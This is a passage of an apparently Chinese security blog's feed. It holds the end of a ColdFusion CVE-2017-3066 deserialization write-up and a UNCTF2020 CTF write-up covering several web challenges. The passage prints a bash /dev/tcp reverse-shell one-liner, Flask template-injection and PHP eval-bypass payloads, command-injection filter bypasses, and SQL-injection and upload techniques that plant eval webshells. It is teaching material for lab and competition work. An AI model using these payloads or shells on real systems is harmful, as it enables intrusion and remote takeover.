src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/2.png" class=""><p>接着访问<code>/flex2gateway/amf</code>,burp抓包，这里要注意的是格式，下图所示</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/3.png" class=""><p>生成的poc要是复制粘贴会有问题，直接用burp导入poc，然后打过去</p><p>进入docker中看一下</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/4.png" class=""><p>下面可以尝试反弹shell，还是要用到之前一个生成java反弹shell的网站</p><p>然后再在kali中生成poc文件</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/5.png" class=""><p>下面的步骤跟上面一样，直接看一下监听的端口有没有反弹</p><img src="/2020/11/14/Adobe-ColdFusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2017-3066/6.png" class=""><p>可以看到成功弹回了shell</p><p>反弹shell格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;a href=&quot;#Adobe-ColdFusion反序列化命令执行&quot; class=&quot;headerlink&quot; title=&quot;Adobe-ColdFusion反序列化命令执行&quot;&gt;&lt;/a&gt;Adobe-ColdFusion反序列化命令执行
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020</title>
    <link href="http://yoursite.com/2020/11/11/UNCTF2020/"/>
    <id>http://yoursite.com/2020/11/11/UNCTF2020/</id>
    <published>2020-11-11T05:28:54.000Z</published>
    <updated>2020-11-19T14:26:11.498Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF2020赛题部分WP"><a href="#UNCTF2020赛题部分WP" class="headerlink" title="UNCTF2020赛题部分WP"></a>UNCTF2020赛题部分WP<a id="more"></a></h1><h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>flask模板注入</li><li>绕过过滤</li></ul><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，要求以admin登录，先到/register下注册，/login登录，刷新拿到/secret_route_you_do_not_know，要求用<code>&#39;guess&#39;</code>猜<code>secret</code></p><p>考察的就是python的flask模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess&#x3D;&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/1.png" class=""><p>经过测试有一下过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,\&quot;,[],__</span><br></pre></td></tr></table></figure><p>下面用到<code>request.args.xx</code>绕过下划线，或者用<code>request.values.xx</code>利用post传参，但是post不被允许</p><p>下面就是一点点构造payload，下面是最终的exp</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/2.png" class=""><h2 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php伪协议</li><li>命令执行绕过长度限制</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，F12源码处发现提示</p><img src="/2020/11/11/UNCTF2020/3.png" class=""><p>加密编码挨个试，发现是base85，在线网站解密</p><img src="/2020/11/11/UNCTF2020/4.png" class=""><p>应该是用GET传参数action，提示了读取源码，用伪协议，base被ban，用string.rot13过滤器，读取index.php和flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假的flag，根据提示，16进制转字符串<code>1nD3x.php</code>，访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>长度有限制，黑名单跟不存在没什么区别，直接用，但是构造了挺久发现长度是问题，找到了p神的文章，完美解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PHP&#x2F;bypass-eval-length-restrict.html</span><br></pre></td></tr></table></figure><p>利用变长参数特性展开数组，详细可以看文章讲解</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：code&#x3D;usort(...$_GET);</span><br><span class="line">GET:?1[]&#x3D;test&amp;1[]&#x3D;命令;&amp;2&#x3D;assert</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/5.png" class=""><h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul><li>路径穿越</li></ul><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的参数要包含<code>unctf.com</code>，后面过滤了挺多，没想到路径穿越进行文件包含，最近题没咋碰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?url=unctf.com/../../../../flag</span><br></pre></td></tr></table></figure><h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>序列化字符串逃逸</li></ul><h3 id="解题过程-3"><a href="#解题过程-3" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个challenge替换成easychallenge能够逃逸4个字符，要求密码为easy，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span><br><span class="line">因为这里只有29个字符，要保持能够正常反序列化，要长度整，最后加3个括号</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ul><li>弱类型比较</li><li>数组序列化</li></ul><h3 id="解题过程-4"><a href="#解题过程-4" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$username</code>和<code>$password</code>被flag.php中的覆盖了，用php弱类型比较，bool和任何字符串比较都为true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">data=a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;b:<span class="number">1</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/6.png" class=""><h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><ul><li>不包含括号的命令执行</li><li>过滤器输出</li></ul><h3 id="解题过程-5"><a href="#解题过程-5" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>匹配到括号就会退出</p><p>输出不能包含flag</p><p>用过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?a=<span class="keyword">include</span> $_GET[<span class="string">'b'</span>];&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">这里可以换别的过滤器</span><br></pre></td></tr></table></figure><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php短标签</li><li>.htaccess</li></ul><h3 id="解题过程-6"><a href="#解题过程-6" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题上传图片马</p><img src="/2020/11/11/UNCTF2020/7.png" class=""><p>对内容进行了检测</p><p>这里想到了php短标签</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);==&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这里还有就是不能把jpg文件解析成php文件，需要上传.htaccess</p><p>由于过滤了ph，换行拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line">Addtype application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure><p>上传图片，抓包修改文件名和内容如上</p><p>之后就可以直接利用马了</p><img src="/2020/11/11/UNCTF2020/8.png" class=""><h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><ul><li>命令执行一些绕过</li></ul><h3 id="解题过程-7"><a href="#解题过程-7" class="headerlink" title="解题过程"></a>解题过程</h3><p>开题，是一个ping窗口，命令执行</p><p>127.0.0.1能够正常返回，下面就是进行测试了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,;,空格，*,flag,cat,$等被过滤了</span><br></pre></td></tr></table></figure><p>没有了分号还能用管道符，空格能用%09代替，flag用fla?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls%<span class="number">09</span>/</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ca\t%<span class="number">09</span>/fla?</span><br></pre></td></tr></table></figure><img src="/2020/11/11/UNCTF2020/9.png" class=""><h2 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h2><h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件判断</li></ul><h3 id="解题过程-8"><a href="#解题过程-8" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="keyword">false</span>))</span><br><span class="line">&#123;</span><br><span class="line">flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">no flag</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//想要拿到flag要让!()为真，也就是比较为false</span></span><br></pre></td></tr></table></figure><p>本地测试传入数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $p = $_GET[<span class="string">'file'</span>];</span><br><span class="line">var_dump($p);<span class="comment">//array(1) &#123; [0]=&gt; string(0) "" &#125;</span></span><br><span class="line">var_dump(is_file($p));<span class="comment">//NULL</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">false</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="keyword">NULL</span>===<span class="keyword">true</span>);<span class="comment">//false</span></span><br><span class="line"><span class="keyword">if</span>((is_file($p)===<span class="keyword">false</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'bad'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到传入数组返回值为NULL，NULL怎么比较返回都是false，所以用数组即可绕过</p><img src="/2020/11/11/UNCTF2020/10.png" class=""><h2 id="checkin-sql"><a href="#checkin-sql" class="headerlink" title="checkin-sql"></a>checkin-sql</h2><h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><ul><li>写入shell</li></ul><h3 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h3><p>堆叠注入，但是set,prepare,execute不能一起用，题目提示flag不在数据库，尝试写入shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"select '&lt;?php eval($_POST[123])?&gt;' into outfile '/var/www/html/1.php'"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(ord(i),end=<span class="string">','</span>)</span><br><span class="line"><span class="comment">#1';PREPARE hacker from concat(char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,49,50,51,93,41,32,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,49,46,112,104,112,39));EXECUTE hacker;</span></span><br></pre></td></tr></table></figure><p>访问1.php，下面就是常规操作了</p><img src="/2020/11/11/UNCTF2020/11.png" class=""><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><ul><li>php复杂变量</li><li>变量覆盖</li><li>sha1比较</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    